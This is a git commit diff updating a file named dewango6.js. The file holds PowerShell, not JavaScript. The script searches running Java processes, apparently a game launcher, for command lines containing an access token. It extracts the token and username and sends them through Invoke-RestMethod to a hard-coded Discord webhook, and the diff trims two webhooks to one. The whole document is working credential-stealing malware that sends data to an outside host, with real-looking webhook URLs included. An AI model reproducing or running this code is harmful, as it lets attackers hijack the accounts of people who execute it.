721e0f2377340609a2d8ebb6d424caf33ccda3d0
Fembexx <hasoob030@gmail.com>
2025-03-29 02:01:26 -0700

    Update dewango6.js

--- dewango6.js
+++ dewango6.js
@@ -1,7 +1,4 @@
-$webhookUrls = @(
-    "https://discord.com/api/webhooks/1353103114567417906/siV5e9L9b1DbEQfdgMSCoCdrpMbJAW7wMHDwYibneuqHzsmnHMdjOWcFGb_Fgx50tF1j",
-    "https://discord.com/api/webhooks/1355466329716555826/4o4CKxxsnUteBr6yjgpVDvpNdJY5WQCND_2LeqD_LdVCY1mEzIFi1TR5yPlWCuJY7_N1"
-)
+$webhookUrl = "https://discord.com/api/webhooks/1353103114567417906/siV5e9L9b1DbEQfdgMSCoCdrpMbJAW7wMHDwYibneuqHzsmnHMdjOWcFGb_Fgx50tF1j"
 
 Get-CimInstance -Query "SELECT CommandLine FROM Win32_Process WHERE Name LIKE 'Java%' AND CommandLine LIKE '%accessToken%'" |
     Select-Object -ExpandProperty CommandLine |
@@ -17,6 +14,7 @@ Get-CimInstance -Query "SELECT CommandLine FROM Win32_Process WHERE Name LIKE 'J
         }
 
         if ($accessToken -and $username) {
+           
             $message = @"
 > **AccessToken:** $accessToken
 > **Username:** $username
@@ -24,13 +22,12 @@ Get-CimInstance -Query "SELECT CommandLine FROM Win32_Process WHERE Name LIKE 'J
 
             Write-Output $message
 
+            
             $payload = @{
                 content = $message
             } | ConvertTo-Json -Depth 10
 
-            # Loop to send the data to both webhooks
-            foreach ($webhookUrl in $webhookUrls) {
-                Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload
-            }
+            
+            Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload
         }
-    }
+    }  	
